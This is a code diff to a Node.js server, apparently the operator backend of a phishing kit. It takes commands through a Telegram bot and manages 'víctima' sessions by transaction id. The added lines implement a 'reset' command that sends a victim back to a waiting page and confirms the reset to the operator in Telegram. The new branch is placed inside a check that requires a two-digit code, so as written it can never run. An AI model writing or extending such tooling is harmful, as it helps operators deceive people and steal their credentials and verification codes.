@@ -125,6 +125,36 @@ app.post('/callback', async (req, res) => {
       const code = parts[1];
 
       if (txid && code && /^\d{2}$/.test(code)) {
+        if (txid && parts[1] && parts[1].toLowerCase() === 'reset') {
+  if (!clientes[txid]) {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: req.body.message.chat.id,
+        text: `❌ txid ${txid} no encontrado`
+      }),
+      agent
+    });
+    return res.sendStatus(200);
+  }
+
+  clientes[txid] = { status: "esperando" };
+  guardarEstado();
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: req.body.message.chat.id,
+      text: `🔄 Reiniciado!\n\n🆔 ID: ${txid}\n\nLa víctima regresará a la página de espera.`
+    }),
+    agent
+  });
+
+  return res.sendStatus(200);
+}
+        
         if (!clientes[txid]) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
